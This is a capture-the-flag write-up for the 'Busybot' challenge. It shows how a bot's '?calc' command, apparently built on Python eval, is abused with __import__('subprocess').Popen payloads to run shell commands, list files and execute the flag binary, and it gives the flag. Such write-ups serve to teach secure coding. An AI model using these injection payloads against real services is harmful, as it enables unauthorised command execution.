# Busybot

## Write-up

1. `?calc` command "evaluates arithmetic expressions"

2. `?calc 1+1` :  

```txt
2
```

3. `?calc 'a'+'b'`

```txt
ab
```

That's a bingo!!  
It's probably using `eval` python function under the hood, so we can theoretically do anything.

4. Look for a way to get command execution, can we import `subprocess` ?

```txt
?calc __import__('subprocess')
```

Reply :  

```txt
<module 'subprocess' from '/usr/local/lib/python3.8/subprocess.py'>
```

Yes we can!

5. Let's execute `ls` :  

```txt
?calc __import__('subprocess').Popen('ls',stdout=-1,shell=True).communicate()[0].decode()
```

Reply :  

```txt
busybot.py
example.env
flag
requirements.txt
riddles.json
```

6. Try to read `flag` ?

```txt
?calc "__import__('subprocess').Popen('cat ./flag',stdout=-1,shell=True).communicate()[0].decode()"
```

No reply.

7. Let's look for more details with `ls -l` :  

```txt
?calc "__import__('subprocess').Popen('ls -l',stdout=-1,shell=True).communicate()[0].decode()"
```

Reply :  

```txt
total 44
-rwxr-xr-x 1 root root  4061 May 29 16:18 busybot.py
-rw-r--r-- 1 root root    58 May 29 16:18 example.env
---x--x--x 1 root root   388 May 29 16:18 flag
-rw-r--r-- 1 root root    28 May 29 16:18 requirements.txt
-rw-r--r-- 1 root root 26044 May 29 16:18 riddles.json
```

`flag` is eXexute-only.

8. Let's execute `./flag` then!

```txt
?calc __import__('subprocess').Popen('./flag',stdout=-1,shell=True).communicate()[0].decode()
```

Reply :  

```txt
shellmates{BE_C4rEfu1L_W17H_3vAl_f0Lk$!!}
```


## Flag

`shellmates{BE_C4rEfu1L_W17H_3vAl_f0Lk$!!}`
